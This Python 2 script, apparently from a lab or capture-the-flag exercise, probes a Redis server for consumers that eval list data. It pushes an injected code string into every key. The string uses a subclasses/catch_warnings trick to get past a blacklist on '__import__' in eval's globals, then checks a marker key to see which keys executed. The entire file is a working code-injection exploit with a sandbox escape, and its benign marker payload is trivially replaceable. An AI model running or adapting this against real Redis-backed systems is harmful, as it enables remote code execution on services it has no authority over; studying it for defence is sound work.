#! /usr/bin/env python
#
# hkr: finds "vulnerable" redis keys


import time

from redis import StrictRedis

from vic import KEY    # works with "static" keys


RHOST = "127.0.0.1"

OKEY = "owned"
SHELL = ("__import__('redis').StrictRedis().zadd('{}', {}, '{}')"
         .format(OKEY, "{}", "{}"))

SLEEP = 2


def bypass(code, parts):
    """Avoid eval's globals blacklist."""
    trick = ("[x for x in (1).__class__.__base__.__subclasses__()" +
             " if x.__name__ == 'catch_warnings'][0]()" +
             "._module.__builtins__['{}']")
    for part in parts:
        code = code.replace(part, trick.format(part))
    return code


def main():
    # make a connection (with custom host/port)
    rcon = StrictRedis(host=RHOST)
    # retrieve all keys
    keys = rcon.keys()
    # if a data structure is empty then the key is gone
    keys.append(KEY)          # already known
    keys = list(set(keys))    # remove duplicates
    print "Found keys: {}".format(keys)
    # try to execute some harmless code :>
    for key in keys:
        if key == OKEY:
            continue    # do not self-hack
        try:    # insert data into list (at both ends)
            args = [
                key,
                bypass(
                    SHELL.format(keys.index(key), key),
                    ["__import__"]
                )
            ]
            rcon.lpush(*args)
            rcon.rpush(*args)
            print "Succeeded: {}".format(key)
        except Exception as exc:
            print "Error: {}".format(exc)
    # wait a little, then check our key
    time.sleep(SLEEP)
    vuln = rcon.zrangebyscore(OKEY, 0, float("+inf"))
    print "Evaluated: {}".format(vuln)


if __name__ == "__main__":
    main()
